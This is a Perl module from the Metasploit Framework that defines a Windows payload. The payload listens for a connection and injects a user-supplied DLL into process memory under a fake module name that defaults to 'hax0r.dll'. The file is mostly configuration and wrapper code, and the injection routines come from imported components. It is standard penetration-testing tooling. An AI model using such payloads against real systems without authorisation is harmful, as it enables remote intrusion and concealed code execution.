
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Payload::win32_bind_dllinject;
use strict;
use base 'Msf::PayloadComponent::Windows::ia32::InjectLibStage';

my $info =
{
	'Name'         => 'Windows Bind DLL Inject',
	'Version'      => '$Revision$',
	'Description'  => 'Listen for connection and inject DLL into process memory',
	'Authors'      => 
		[
			'Matt Miller <mmiller [at] hick.org>',
			'Jarkko Turkulainen <jt [at] klake.org>',
		],
	'UserOpts'     => 
		{ 
			'DLL'     => [1, 'PATH', 'The full path to the DLL that should be injected'],
			'DLLNAME' => [0, 'PATH', 'The name of the DLL as it will appear in the module list'] 
		},
};

sub _Load 
{
	Msf::PayloadComponent::Windows::ia32::InjectLibStage->_Import('Msf::PayloadComponent::Windows::ia32::BindStager');

	__PACKAGE__->SUPER::_Load();
}

sub new 
{
	my $class = shift;
	my $hash = @_ ? shift : { };
	my $self;

	_Load();

	$hash = $class->MergeHashRec($hash, {'Info' => $info});
	$self = $class->SUPER::new($hash, @_);

	return($self);
}

#
# Returns the path to the DLL that is to be injected
#
sub _InjectDLL 
{
	my $self = shift;

	return $self->GetVar('DLL');
}

#
# Returns the name of the DLL that is to be injected (fake name)
#
sub _InjectDLLName 
{
	my $self = shift;
	my $name =  $self->GetVar('DLLNAME');

	$name = "hax0r.dll" if (not defined($name));

	return $name;
}

1;
